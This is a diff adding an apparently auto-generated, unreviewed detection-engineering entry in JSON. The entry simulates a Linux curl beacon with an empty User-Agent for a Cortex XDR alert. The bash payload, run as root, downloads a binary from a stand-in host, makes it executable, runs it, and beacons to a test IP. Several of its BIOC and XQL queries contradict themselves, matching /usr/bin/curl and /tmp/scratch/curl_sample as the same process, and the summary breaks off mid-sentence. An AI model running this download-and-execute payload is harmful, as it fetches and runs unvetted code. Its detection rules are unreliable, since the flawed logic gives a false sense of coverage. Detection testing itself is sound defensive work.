@@ -1,0 +1,148 @@
+{
+  "id": "TTP-0000-0037",
+  "schema_version": "1.0.0",
+  "entry_version": "0.1.0",
+  "status": "draft",
+  "metadata": {
+    "created_at": "2026-11-12T00:00:00Z",
+    "updated_at": "2026-11-12T00:00:00Z",
+    "authors": [
+      {
+        "name": "detdev pipeline (local model, unreviewed)",
+        "role": "generator"
+      }
+    ],
+    "tags": [
+      "generated-draft",
+      "platform-linux",
+      "endpoint",
+      "cortex-analytics-alert"
+    ],
+    "pov_engine": {
+      "auto_load": false,
+      "simulation_class": "endpoint",
+      "destructive": false,
+      "platforms": [
+        "linux"
+      ],
+      "cleanup_required": true,
+      "safety_class": "lab-only"
+    }
+  },
+  "identity": {
+    "name": "Suspicious curl beacon with empty User-Agent to rare C2 host",
+    "summary": "An endpoint executes a curl command with an empty User-Agent header to a rare IP address, indicative of C2 beaconing. Cortex should detect this behavior as suspicious due to the unusual User-Agent and",
+    "description": "An endpoint executes a curl command with an empty User-Agent header to a rare IP address, indicative of C2 beaconing. Cortex should detect this behavior as suspicious due to the unusual User-Agent and destination IP."
+  },
+  "mitre_attack": {
+    "matrix": "enterprise",
+    "techniques": [
+      {
+        "technique_id": "T1071",
+        "subtechnique_id": "T1071.001",
+        "name": "Application Layer Protocol: Web Protocols",
+        "tactic_ids": [
+          "TA0011"
+        ],
+        "tactic_names": [
+          "Command and Control"
+        ]
+      }
+    ]
+  },
+  "execution": {
+    "target_platform": "linux",
+    "execution_framework": "custom-cortex",
+    "privilege_required": "root",
+    "payload": {
+      "interpreter": "bash",
+      "code": "mkdir -p /tmp/scratch\nwget -O /tmp/scratch/curl_sample https://example.com/curl_binary\nchmod +x /tmp/scratch/curl_sample\n/tmp/scratch/curl_sample -H \"User-Agent: \" -X GET http://192.0.2.10:8080/beacon\n",
+      "input_variables": [],
+      "timeout_seconds": 120
+    },
+    "expected_artifacts": [
+      {
+        "artifact_type": "network-connection",
+        "description": "Outbound curl connection with empty User-Agent",
+        "expected_value": "action_remote_ip = '192.0.2.10' and dst_port = 8080 and actor_process_image_name = '/tmp/scratch/curl_sample'"
+      }
+    ],
+    "cleanup": {
+      "manual_steps": [
+        "Not authored. Write and test cleanup before promotion."
+      ]
+    }
+  },
+  "detections": {
+    "biocs": [
+      {
+        "name": "Suspicious curl user agent",
+        "description": "Detection of curl process making outbound connections with empty or suspicious User-Agent header",
+        "logic": "dataset = xdr_data\n| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START\n| filter actor_process_image_name = '/tmp/scratch/curl_sample'\n| filter action_process_image_name = '/usr/bin/curl'\n| filter action_remote_ip = '192.0.2.10'\n| filter action_file_path = '/tmp/scratch/curl_sample'",
+        "mitre_technique_ids": [
+          "T1071.001"
+        ],
+        "severity": "high",
+        "suppression_window_seconds": 0
+      }
+    ],
+    "abiocs": [
+      {
+        "name": "Suspicious curl user agent",
+        "description": "Behavioral deviation modeling curl beaconing with empty User-Agent header to rare C2 host",
+        "logic": "dataset = xdr_data\n| filter event_type = ENUM.NETWORK\n| filter action_remote_ip = '192.0.2.10'\n| filter dst_port = 8080\n| filter action_process_image_name = '/usr/bin/curl'\n| filter action_file_path = '/tmp/scratch/curl_sample'\n| filter actor_process_image_name = '/tmp/scratch/curl_sample'",
+        "behavioral_profile": "machine-learning",
+        "causality_anchor": "curl process starting with empty User-Agent header",
+        "mitre_technique_ids": [
+          "T1071.001"
+        ],
+        "severity": "high"
+      }
+    ],
+    "xql_queries": [
+      {
+        "purpose": "validation",
+        "name": "Curl beacon with empty User-Agent",
+        "query": "dataset = xdr_data\n| filter event_type = ENUM.NETWORK\n| filter action_remote_ip = '192.0.2.10'\n| filter dst_port = 8080\n| filter action_process_image_name = '/usr/bin/curl'\n| filter action_file_path = '/tmp/scratch/curl_sample'\n| filter actor_process_image_name = '/tmp/scratch/curl_sample'\n| filter action_user_agent = ''",
+        "expected_rows_min": 1,
+        "dataset": "xdr_data"
+      }
+    ],
+    "correlation_rules": [],
+    "iocs": [],
+    "analytics_modules": [
+      "Cortex XSIAM Analytics (XDR Agent) — Suspicious curl user agent; Required Data: XDR Agent; ATT&CK T1071.001. Ref: cortex-docs.paloaltonetworks.com/analytics-alerts."
+    ]
+  },
+  "panw_mapping": {
+    "products": [
+      {
+        "module": "cortex-xdr",
+        "submodule": "analytics",
+        "coverage_tier": "detection"
+      }
+    ]
+  },
+  "references": [
+    {
+      "title": "Cortex XDR Analytics Alert Reference: Suspicious curl user agent",
+      "url": "https://cortex-docs.paloaltonetworks.com/analytics-alerts/alerts-by-name/suspicious-curl-user-agent",
+      "publisher": "Palo Alto Networks",
+      "primary": true
+    },
+    {
+      "title": "MITRE ATT&CK T1071.001",
+      "url": "https://attack.mitre.org/techniques/T1071/001/",
+      "publisher": "MITRE",
+      "publisher_id": "SRC-MITRE-ATTACK"
+    }
+  ],
+  "changelog": [
+    {
+      "entry_version": "0.1.0",
+      "date": "2026-11-12",
+      "author": "detdev pipeline (local model, unreviewed)",
+      "change": "Generated draft. Built from the model fragment and its recorded source only; not reviewed, not run."
+    }
+  ]
+}
